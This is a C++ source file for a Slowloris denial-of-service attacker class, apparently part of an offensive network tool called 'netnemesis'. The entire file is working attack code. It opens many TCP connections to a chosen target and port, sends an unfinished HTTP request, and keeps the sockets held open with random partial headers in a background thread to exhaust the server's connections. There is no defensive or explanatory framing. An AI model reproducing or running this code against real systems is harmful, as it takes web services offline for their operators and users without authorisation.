#include "netnemesis.h"

SlowlorisAttacker::SlowlorisAttacker() : running(false) {}

SlowlorisAttacker::~SlowlorisAttacker() {
    stop();
}

void SlowlorisAttacker::maintainConnections(const std::string &target, int port) {
    std::string http_request = "GET / HTTP/1.1\r\n"
                               "Host: " + target + "\r\n"
                               "User-Agent: Mozilla/5.0\r\n";
    
    while (running) {
        // Open new connections if needed
        while (connections.size() < static_cast<size_t>(max_connections) && running) {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) break;
            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(port);
            inet_pton(AF_INET, target.c_str(), &addr.sin_addr);
            
            if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
                send(sock, http_request.c_str(), http_request.length(), 0);
                connections.push_back(sock);
                Utils::logInfo("Slowloris: Connection " + 
                    std::to_string(connections.size()) + " opened");
            } else {
                close(sock);
                break;
            }
            usleep(100000); // 100ms between connections
        }
        
        // Keep connections open by sending partial headers
        for (auto it = connections.begin(); it != connections.end();) {
            std::string partial_header = "X-a: " + std::to_string(rand()) + "\r\n";
            if (send(*it, partial_header.c_str(), partial_header.length(), 0) < 0) {
                close(*it);
                it = connections.erase(it);
            } else {
                ++it;
            }
        }
        
        Utils::logAttack("Slowloris: " + std::to_string(connections.size()) + 
            " active connections");
        sleep(10); // Wait before the next keepalive
    }
}

void SlowlorisAttacker::attack(const std::string &target, int port, int num_connections) {
    max_connections = num_connections;
    running = true;
    Utils::logAttack("Starting Slowloris against " + target + ":" + std::to_string(port) + " with max " + std::to_string(num_connections) + " connections");
    maintainer_thread = std::thread(&SlowlorisAttacker::maintainConnections, this, target, port);
}

void SlowlorisAttacker::stop() {
    running = false;
    for (int sock : connections) {
        close(sock);
    }
    connections.clear();
    if (maintainer_thread.joinable()) maintainer_thread.join();
}